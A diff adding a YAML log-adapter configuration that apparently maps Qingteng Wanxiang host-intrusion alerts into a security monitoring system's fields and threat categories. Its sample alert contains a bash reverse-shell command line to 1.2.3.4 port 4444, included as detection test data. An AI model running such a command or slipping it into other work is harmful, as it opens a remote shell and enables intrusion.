@@ -1,0 +1,34 @@
+id: adapter.qingtuan.wanxiang
+vendor: 青藤云安全
+product: 青藤万相（主机自适应安全 HIDS）
+vendor_doc: "青藤万相 v3.4 Syslog 手册"
+protocol: syslog-tcp
+parse:
+  format: json
+mapping:
+  "@timestamp": "$.occur_time"
+  "src.ip": "$.src_ip"
+  "src.asset_id": "lookup:$.agent_id"
+  "dst.ip": "$.dst_ip"
+  "event.name": "$.alert_name"
+  "event.category": "endpoint"
+  "event.outcome": "detected"
+  "process.name": "$.process_name"
+  "process.command_line": "$.cmdline"
+  "user.name": "$.username"
+  "file.path": "$.file_path"
+  "event.severity": "lookup:$.risk_level"
+  "sime.threat_id": "lookup:$.alert_type"
+threat_map:
+  "reverse_shell": sime.tht.reverse-shell
+  "brute_force": sime.tht.bruteforce
+  "webshell": sime.tht.webshell-detect
+  "virus": sime.tht.virus
+  "privilege_escalation": sime.tht.priv-esc
+normalize:
+  "event.severity":
+    "1": low
+    "2": medium
+    "3": high
+    "4": critical
+sample: '{"occur_time":"2025-04-27 12:14:31","src_ip":"10.233.71.60","agent_id":"QT-88120","dst_ip":"10.233.71.61","alert_type":"reverse_shell","alert_name":"检测到反弹Shell","risk_level":"4","process_name":"bash","cmdline":"bash -i >& /dev/tcp/1.2.3.4/4444","username":"app01","file_path":"/tmp/.s"}'
